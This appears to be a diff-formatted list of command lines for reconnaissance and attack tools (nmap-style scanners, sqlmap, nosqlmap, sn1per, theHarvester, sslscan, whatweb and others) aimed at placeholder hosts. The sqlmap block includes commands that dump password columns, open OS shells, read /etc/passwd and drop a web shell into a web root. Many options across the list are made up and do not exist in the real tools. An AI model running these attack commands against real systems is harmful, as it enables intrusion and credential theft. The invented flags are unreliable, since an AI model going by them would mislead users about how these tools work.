+nosqlmap -u "http://example.com/api" --skip-waf
+nosqlmap -u "http://example.com/api" --tamper /path/to/tamper.py
+nosqlmap -u "http://example.com/api" --exclude-params "csrf,token"
+nosqlmap -u "http://example.com/api" --include-params "search,q"
+nosqlmap -u "http://example.com/api" --crawl
+nosqlmap -u "http://example.com/api" --exclude-urls "/logout,/signout"
+
+
+nslookup example.com
+nslookup 192.168.1.1
+nslookup -type=A example.com
+nslookup -type=AAAA example.com
+nslookup -type=MX example.com
+nslookup -type=NS example.com
+nslookup -type=TXT example.com
+nslookup -type=PTR 192.168.1.1
+nslookup -type=SOA example.com
+nslookup -type=SRV _sip._tcp.example.com
+nslookup -type=CAA example.com
+nslookup -type=DNSKEY example.com
+nslookup -type=DS example.com
+nslookup -type=HINFO example.com
+nslookup -type=RP example.com
+nslookup -type=ANY example.com
+nslookup -debug example.com
+nslookup -retry=3 example.com
+nslookup -timeout=10 example.com
+nslookup -port=53 example.com
+nslookup -class=IN example.com
+nslookup -class=CH example.com
+nslookup -class=HS example.com
+nslookup -vc example.com
+nslookup -interactive
+nslookup -set_type=ANY example.com
+nslookup -set_class=CHAOS example.com
+nslookup example.com 8.8.8.8
+nslookup example.com 1.1.1.1
+nslookup example.com 192.168.1.1
+nslookup example.com -server 8.8.8.8
+nslookup -query=ANY example.com
+nslookup example.com -port=5353
+nslookup example.com -retry=5
+nslookup -set_d2 example.com
+nslookup -fail example.com
+nslookup example.com -timeout=5
+nslookup example.com -debug
+nslookup example.com -nocookie
+nslookup -nodebug example.com
+
+openssl s_client -connect example.com:443
+openssl s_client -connect 93.184.216.34:443 -servername example.com
+openssl s_client -connect example.com:443 -showcerts
+openssl s_client -connect example.com:443 -status
+openssl s_client -connect example.com:443 -alpn h2
+openssl s_client -connect example.com:443 -alpn http/1.1
+openssl s_client -connect example.com:443 -cipher 'ECDHE-RSA-AES128-GCM-SHA256'
+openssl s_client -connect example.com:443 -tls1_2
+openssl s_client -connect example.com:443 -tls1_3
+openssl s_client -connect example.com:443 -no_tls1_3
+openssl s_client -connect example.com:443 -tls1_1
+openssl s_client -connect example.com:443 -ssl3
+openssl s_client -connect example.com:443 -ssl2
+openssl s_client -connect example.com:443 -crlf
+openssl s_client -connect example.com:443 -ign_eof
+openssl s_client -connect example.com:443 -servername example.com -verify 5
+openssl s_client -connect example.com:443 -CAfile /dev/null
+openssl s_client -connect example.com:443 -verify_hostname example.com
+openssl s_client -connect example.com:443 -showcerts -verify_hostname example.com
+openssl s_client -connect example.com:443 -sess_out /dev/stdout | openssl x509 -noout -text
+openssl s_client -connect example.com:443 </dev/null | sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' | openssl x509 -noout -text
+openssl s_client -connect example.com:443 </dev/null 2>/dev/null | openssl x509 -noout -fingerprint -sha256
+openssl s_client -connect example.com:443 -status </dev/null 2>/dev/null | openssl ocsp -noverify -resp_text -reqin /dev/stdin
+openssl s_client -starttls smtp -connect mail.example.com:25
+openssl s_client -starttls imap -connect mail.example.com:143
+openssl s_client -starttls pop3 -connect mail.example.com:110
+openssl s_client -starttls ftp -connect ftp.example.com:21
+openssl s_client -starttls smtp -connect mail.example.com:587 -crlf
+openssl s_client -connect example.com:443 -servername example.com -cipher 'ALL' -quiet
+openssl s_client -connect example.com:443 -brief
+openssl s_client -connect example.com:443 -msg -debug
+openssl s_client -connect example.com:443 -showcerts -verify_return_error
+openssl s_client -connect example.com:443 -sess_out /dev/stdout -sess_in /dev/stdin
+openssl s_client -connect example.com:443 -servername example.com -tlsextdebug
+openssl s_client -connect example.com:443 -servername example.com -alpn h2,http/1.1
+openssl s_client -connect example.com:443 -servername example.com -verify 10
+
+
+ping example.com
+ping 192.168.1.1
+ping -c 4 example.com
+ping -i 0.5 example.com
+ping -t 10 example.com
+ping -s 1024 example.com
+ping -W 3 example.com
+ping -p ff example.com
+ping -D example.com
+ping -R example.com
+ping -n example.com
+ping -q example.com
+ping -a 192.168.1.1
+ping -b 192.168.1.255
+ping -l 1000 example.com
+ping -f example.com
+ping -v example.com
+ping -U example.com
+ping -T tstamp example.com
+ping -S 192.168.1.100 example.com
+ping -c 10 -i 0.1 example.com
+ping -6 example.com
+ping -p 0xdeadbeef example.com
+ping -r 5 example.com
+ping -m 4 example.com
+ping -A example.com
+ping -D -s 32 example.com
+ping -c 10 -q 192.168.1.1
+ping -p "ABC" 192.168.1.1
+ping -s 64 -c 5 example.com
+ping -I eth0 example.com
+ping -e example.com
+ping -S 192.168.0.1 example.com
+ping -C example.com
+ping -l 4096 example.com
+ping -t 255 example.com
+ping -W 1 example.com
+ping -D -s 32 example.com
+ping -q 192.168.1.1
+
+
+sniper -t example.com
+sniper -t 192.168.1.1
+sniper -t example.com -m quick
+sniper -t example.com -m full
+sniper -t example.com -m web
+sniper -t example.com -m passive
+sniper -t example.com -m discovery
+sniper -t example.com -m stealth
+sniper -t example.com -m vuln
+sniper -t example.com -m ports
+sniper -t example.com -m creds
+sniper -t example.com --nmap
+sniper -t example.com --mass
+sniper -t example.com --tor
+sniper -t example.com --threads 10
+sniper -t example.com --verbose
+sniper -t example.com --debug
+sniper -t example.com --silent
+sniper -t example.com --no-update
+sniper --update
+sniper --update-db
+sniper --configure
+sniper --list-plugins
+sniper --enable-plugin <plugin_name>
+sniper --disable-plugin <plugin_name>
+sniper --resume <scan_id>
+sniper --stop <scan_id>
+sniper --status <scan_id>
+sniper --targets example.com,sub.example.com
+sniper -t example.com --exclude-paths "/admin,/logout"
+sniper -t example.com --user-agent "Mozilla/5.0"
+sniper -t example.com --cookie "SESSION=abcd1234"
+sniper -t example.com --headers "Referer:https://example.com"
+sniper -t example.com --timeout 15
+sniper -t example.com --max-retries 3
+sniper -t example.com --no-colors
+sn1per -t example.com
+sn1per -t example.com -m quick
+sn1per -t example.com -m full
+sn1per -t example.com --tor
+sn1per -t example.com --threads 20
+sn1per --update
+sn1per --list-plugins
+
+
+sqlmap -u "http://example.com/vuln.php?id=1"
+sqlmap -u "http://example.com/vuln.php?id=1" -p id
+sqlmap -u "http://example.com/vuln.php?id=1" --data="id=1&name=test"
+sqlmap -u "http://example.com/vuln.php?id=1" --cookie="SESSION=abcd1234"
+sqlmap -u "http://example.com/vuln.php?id=1" --batch
+sqlmap -u "http://example.com/vuln.php?id=1" --level=5 --risk=3
+sqlmap -u "http://example.com/vuln.php?id=1" --dbs
+sqlmap -u "http://example.com/vuln.php?id=1" -D targetdb --tables
+sqlmap -u "http://example.com/vuln.php?id=1" -D targetdb -T users --columns
+sqlmap -u "http://example.com/vuln.php?id=1" -D targetdb -T users -C id,username,password --dump
+sqlmap -u "http://example.com/vuln.php?id=1" --dump-all
+sqlmap -u "http://example.com/vuln.php?id=1" --search -T users -C password
+sqlmap -u "http://example.com/vuln.php?id=1" --sql-shell
+sqlmap -u "http://example.com/vuln.php?id=1" --os-shell
+sqlmap -u "http://example.com/vuln.php?id=1" --os-pwn
+sqlmap -u "http://example.com/vuln.php?id=1" --file-read="/etc/passwd"
+sqlmap -u "http://example.com/vuln.php?id=1" --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"
+sqlmap -u "http://example.com/vuln.php?id=1" --os-cmd="id"
+sqlmap -u "http://example.com/vuln.php?id=1" --technique=BEUST
+sqlmap -u "http://example.com/vuln.php?id=1" --dbms=mysql
+sqlmap -u "http://example.com/vuln.php?id=1" --dbms=postgresql
+sqlmap -u "http://example.com/vuln.php?id=1" --identify-waf
+sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment,between
+sqlmap -u "http://example.com/vuln.php?id=1" --random-agent
+sqlmap -u "http://example.com/vuln.php?id=1" --user-agent="Mozilla/5.0"
+sqlmap -u "http://example.com/vuln.php?id=1" --tor --check-tor
+sqlmap -u "http://example.com/vuln.php?id=1" --threads=10
+sqlmap -u "http://example.com/vuln.php?id=1" --timeout=10
+sqlmap -u "http://example.com/vuln.php?id=1" --time-sec=10
+sqlmap -u "http://example.com/vuln.php?id=1" --technique=U
+sqlmap -u "http://example.com/vuln.php?id=1" --technique=T
+sqlmap -u "http://example.com/vuln.php?id=1" --hex
+sqlmap -u "http://example.com/vuln.php?id=1" --ignore-code=404,403
+sqlmap -u "http://example.com/vuln.php?id=1" --skip-waf
+sqlmap -u "http://example.com/vuln.php?id=1" --skip="csrf,token"
+sqlmap -u "http://example.com/vuln.php?id=1" --include="id,name,price"
+sqlmap -u "http://example.com/vuln.php?id=1" --cookies-from-url="http://example.com"
+sqlmap -u "http://example.com/vuln.php?id=1" --auth-type=basic --auth-cred="user:pass"
+sqlmap -u "http://example.com/vuln.php?id=1" --auth-type=ntlm --auth-cred="DOMAIN\\user:pass"
+sqlmap -u "http://example.com/vuln.php?id=1" --forms
+sqlmap -u "http://example.com/vuln.php?id=1" --crawl=3
+sqlmap -u "http://example.com/vuln.php?id=1" --skip="logout,signout"
+sqlmap -u "http://example.com/vuln.php?id=1" --exclude-sysdbs
+sqlmap -u "http://example.com/vuln.php?id=1" --flush-session
+sqlmap -u "http://example.com/vuln.php?id=1" --resume
+sqlmap -u "http://example.com/vuln.php?id=1" --check
+sqlmap -u "http://example.com/vuln.php?id=1" --batch --answers="Y/n"
+sqlmap -u "http://example.com/vuln.php?id=1" -v 3
+sqlmap -u "http://example.com/vuln.php?id=1" -v 5
+sqlmap -u "http://example.com/vuln.php?id=1" --banner
+sqlmap -u "http://example.com/vuln.php?id=1" --current-db
+sqlmap -u "http://example.com/vuln.php?id=1" --is-dba
+sqlmap -u "http://example.com/vuln.php?id=1" --privileges
+sqlmap -u "http://example.com/vuln.php?id=1" --comments
+sqlmap -u "http://example.com/vuln.php?id=1" --stop
+sqlmap -u "http://example.com/vuln.php?id=1" --test-filter="1,2,3"
+sqlmap -u "http://example.com/vuln.php?id=1" --search -D mysql -T user
+sqlmap -u "http://example.com/vuln.php?id=1" --workers=10
+sqlmap -u "http://example.com/vuln.php?id=1" --answers="follow=Y"
+sqlmap -u "http://example.com/vuln.php?id=1" --output-dir=/dev/null
+
+
+sslscan example.com:443
+sslscan 93.184.216.34:443
+sslscan --no-failed example.com:443
+sslscan --show-certificate example.com:443
+sslscan --show-cipher example.com:443
+sslscan --tls1 example.com:443
+sslscan --tls1_1 example.com:443
+sslscan --tls1_2 example.com:443
+sslscan --tls1_3 example.com:443
+sslscan --ssl2 example.com:443
+sslscan --ssl3 example.com:443
+sslscan --starttls=smtp mail.example.com:25
+sslscan --starttls=imap mail.example.com:143
+sslscan --starttls=pop3 mail.example.com:110
+sslscan --starttls=ftp ftp.example.com:21
+sslscan --starttls=smtp mail.example.com:587
+sslscan --sni example.com:443
+sslscan --no-fallback example.com:443
+sslscan --verbose example.com:443
+sslscan --quick example.com:443
+sslscan --timeout 5 example.com:443
+sslscan --connect-timeout 5 example.com:443
+sslscan --no-colour example.com:443
+sslscan --http example.com:80
+sslscan --http --sni example.com:80
+sslscan --scan-weak example.com:443
+sslscan --showcerts example.com:443
+sslscan --cipher-list "ECDHE-RSA-AES128-GCM-SHA256" example.com:443
+sslscan --version
+sslscan --help
+
+
+sublister -d example.com
+sublister -d example.com -t 50
+sublister -d example.com --threads 50
+sublister -d example.com -b
+sublister -d example.com --bruteforce
+sublister -d example.com -e google,bing,yahoo
+sublister -d example.com --engines google,bing,yahoo
+sublister -d example.com -v
+sublister -d example.com --verbose
+sublister -d example.com -p 80,443
+sublister -d example.com --ports 80,443
+sublister -d example.com --workers 20
+sublister -d example.com --no-colour
+sublister -d example.com --no-color
+sublister -d example.com --timeout 10
+sublister -d example.com --wide
+sublister -a example.com
+sublister --all example.com
+sublist3r.py -d example.com
+python sublist3r.py -d example.com -t 50
+python sublist3r.py -d example.com -b
+python sublist3r.py -d example.com -e google,bing,yahoo
+python sublist3r.py -d example.com -v
+python sublist3r.py -d example.com --threads 30
+
+
+theharvester -d example.com -b google
+theharvester -d example.com -b bing
+theharvester -d example.com -b baidu
+theharvester -d example.com -b yahoo
+theharvester -d example.com -b duckduckgo
+theharvester -d example.com -b github
+theharvester -d example.com -b crtsh
+theharvester -d example.com -b certspotter
+theharvester -d example.com -b shodan
+theharvester -d example.com -b virustotal
+theharvester -d example.com -b linkedin
+theharvester -d example.com -b twitter
+theharvester -d example.com -b netcraft
+theharvester -d example.com -b hunter
+theharvester -d example.com -b pgp
+theharvester -d example.com -b all
+theharvester -d example.com -b google -l 500
+theharvester -d example.com -b github -l 200
+theharvester -d example.com -b crtsh -l 1000
+theharvester -d example.com -b shodan -l 100
+theharvester -d example.com -b virustotal -l 300
+theharvester -d example.com -b google -v
+theharvester -d example.com -b all -v
+theharvester -d example.com -b google,bing,github
+theharvester -d example.com -b google --limit 200
+theharvester -d example.com -b hunter --emails-only
+theharvester -d example.com -b hunter -l 100
+theharvester -d example.com -b crtsh --dns
+theharvester -d example.com -b certspotter --dns
+theharvester -d example.com -b shodan --ip
+theharvester -d example.com -b all -l 1000 -v
+theharvester -d example.com -b google --source google
+theharvester -d example.com --only-ips
+theharvester -d example.com --only-hosts
+theharvester -d example.com --only-emails
+theharvester -d example.com --only-subdomains
+theharvester -d example.com -b google --min-rate 1
+theharvester -d example.com -b bing --timeout 10
+theharvester -d example.com -b netcraft --threads 10
+theharvester -d example.com -b shodan --api-key YOUR_API_KEY
+theharvester -d example.com -b virustotal --api-key YOUR_API_KEY
+theharvester -d example.com -b hunter --api-key YOUR_API_KEY
+theharvester -d example.com -b crtsh -v
+
+
+traceroute example.com
+traceroute 93.184.216.34
+traceroute -n example.com
+traceroute -m 30 example.com
+traceroute -f 5 example.com
+traceroute -q 1 example.com
+traceroute -q 3 example.com
+traceroute -w 2 example.com
+traceroute -A example.com
+traceroute -I example.com
+traceroute -T example.com
+traceroute -U example.com
+traceroute -p 80 example.com
+traceroute -p 443 example.com
+traceroute -s 192.168.1.100 example.com
+traceroute -i eth0 example.com
+traceroute -F example.com
+traceroute -g 192.0.2.1 example.com
+traceroute -G 192.0.2.1 example.com
+traceroute -P ICMP example.com
+traceroute -P TCP example.com
+traceroute -P UDP example.com
+traceroute -T -p 443 example.com
+traceroute -n -w 1 -q 2 example.com
+traceroute -m 64 -w 1 example.com
+traceroute -f 2 -m 20 example.com
+traceroute -s fe80::1 -6 2001:db8::1
+traceroute -6 example.com
+traceroute6 example.com
+traceroute6 -n example.com
+traceroute -n -A 93.184.216.34
+traceroute -i wlan0 -n example.com
+traceroute -P TCP -p 22 example.com
+traceroute -P UDP -p 33434 example.com
+traceroute -F -n example.com
+traceroute -q 5 -w 3 example.com
+traceroute -m 10 -f 1 example.com
+traceroute -s 10.0.0.5 -p 8080 example.com
+traceroute -n -P ICMP example.com
+traceroute --help
+
+
+whatweb https://example.com
+whatweb http://example.com
+whatweb -v https://example.com
+whatweb --verbose https://example.com
+whatweb -a 3 https://example.com
+whatweb --aggression 3 https://example.com
+whatweb -p wordpress,php,apache https://example.com
+whatweb --plugin=wordpress,php,apache https://example.com
+whatweb -U "Mozilla/5.0 (X11; Linux x86_64)" https://example.com
+whatweb --user-agent "Mozilla/5.0 (X11; Linux x86_64)" https://example.com
+whatweb --cookie "SESSION=abcd1234" https://example.com
+whatweb --follow-redirects https://example.com
+whatweb --no-redirect https://example.com
+whatweb --timeout 10 https://example.com
+whatweb --no-errors https://example.com
+whatweb --color https://example.com
+whatweb --no-color https://example.com
+whatweb --log-xml report.xml https://example.com
+whatweb --log-json report.json https://example.com
+whatweb --single-line https://example.com
+whatweb --scan-plugins https://example.com
+whatweb --no-plugins https://example.com
+whatweb -t 40 https://example.com
+whatweb --threads 40 https://example.com
+whatweb --followlinks https://example.com
+whatweb --max-redirects 5 https://example.com
+whatweb --geoip https://example.com
+whatweb --plugins-dir /path/to/plugins https://example.com
+whatweb --update-plugins
+whatweb --debug https://example.com
+whatweb --silent https://example.com
+whatweb --exclude-plugins apache,google https://example.com
+whatweb --include-plugins wpscan,wordpress https://example.com
+whatweb --fingerprint https://example.com
+whatweb --identify-php https://example.com
+whatweb --pretty https://example.com
+
+
+whois example.com
+whois 93.184.216.34
+whois google.com
+whois --verbose example.com
+whois -h whois.iana.org example.com
+whois -h whois.verisign-grs.com example.com
+whois -h whois.ripe.net 93.184.216.34
+whois -h whois.apnic.net 1.1.1.1
+whois -h whois.lacnic.net 200.7.86.5
+whois -h whois.afrinic.net 196.201.216.1
+whois -h whois.nic.xyz example.xyz
+whois -H example.com
+whois -p 43 example.com
+whois -B example.com
+whois --host=whois.arin.net 192.0.2.0
+whois --port=43 example.com
+whois --no-recursion example.com
